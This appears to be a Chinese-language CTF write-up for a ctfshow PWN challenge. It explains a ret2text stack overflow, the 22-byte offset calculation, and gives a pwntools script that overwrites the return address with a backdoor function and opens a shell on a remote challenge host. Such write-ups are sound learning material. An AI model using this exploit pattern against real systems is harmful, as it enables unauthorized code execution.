---
title: ret2text
date: '2025-6-14 22:00'
categories:
  - PWN
  - ret2text 栈溢出
---
![](/images/{10D37E23-7399-4EDB-BFAE-C6662B1460E6}.png)
检查安全机制发现 **NX (No-Execute) 已启用**，这意味着栈内存不可执行，因此无法直接执行栈上的 shellcode。但题目中有一个明显的 **后门函数**，这应该才是解题的关键。
![](/images//assets/images/Pastedimage20250605162859.png)
![](/images//assets/images/Pastedimage20250605162923.png)
![](/images//assets/images/Pastedimage20250605160858.png)
![](/images/{3115B1EC-E572-40CA-94A3-ACD9DAAACB99}.png)
### 一、漏洞点分析
1. **`ctfshow` 函数的栈溢出**：
 ```c
ssize_t ctfshow() {
    char buf[14]; // [esp+6h] [ebp-12h] BYREF
    return read(0, buf, 0x32u); // 读取 0x32（50）字节到 14 字节的 buf → 栈溢出
}
```
1. **缓冲区大小**：`buff[14]` 实际占用14字节
2. **栈位置**：`[ebp-12h]` (12h = 18字节)
3. **读取长度**：0x32u (50字节)
### 正确的偏移计算
1. 从缓冲区开始到保存的EBP：`ebp - buff = 12h = 18字节`
2. 从保存的EBP到返回地址：返回地址位于`EBP+4`处，需要额外4字节
3. **总偏移**：18字节(到EBP) + 4字节(覆盖EBP) = 22字节
```python
from pwn import *

context(arch='i386', os='linux', log_level='debug')

# 启动进程或远程连接
# p = process('./pwn4')  # 本地测试
p = remote('10.190.131.17', 53288)  # 远程攻击

# 构造payload
payload = b'A' * (0x12+4)        # 填充18字节
payload += p32(0x08048521) # 覆盖返回地址为backdoor

p.sendline(payload)# 发送payload
p.interactive()# 获取交互式shell
```
![](/images/{AE10E247-E07F-4983-96FD-5C8A57C3DC35}.png)












